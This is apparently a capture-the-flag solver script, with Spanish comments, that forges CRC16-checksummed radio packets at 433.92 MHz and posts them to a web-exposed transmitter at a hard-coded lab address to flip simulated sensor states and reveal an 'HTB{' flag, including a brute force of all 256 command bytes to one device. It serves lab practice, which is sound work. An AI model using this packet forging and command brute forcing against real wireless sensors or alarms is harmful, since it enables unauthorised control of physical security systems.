#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 118: Enviar paquetes BIG-ENDIAN completos
print("[*] INNOVACIÓN 118: Big-endian CRC")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('>H', crc)).hex().upper()  # BIG-ENDIAN
    print(f"  {addr:02X}{cmd:02X} BE: {packet}")
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(3)
r = s.get(base_url)
sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"States: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 119: Enviar comandos en orden alfabético de dirección
print("\n[*] INNOVACIÓN 119: Alphabetical order")
s = requests.Session()
s.get(base_url)

addresses_sorted = sorted([(0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1), (0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF)])

for addr, cmd in addresses_sorted:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(3)
r = s.get(base_url)
if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 120: Probar TODOS los comandos a UN solo dispositivo
print("\n[*] INNOVACIÓN 120: All commands to E1")
s = requests.Session()
s.get(base_url)

all_commands = list(range(0x00, 0x100))
for cmd in all_commands:
    data = bytes([0xE1, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

print(f"[*] Sent 256 commands to E1")
time.sleep(5)
r = s.get(base_url)
sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"States: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

print("\n[*] Innovaciones 118-120 completadas")
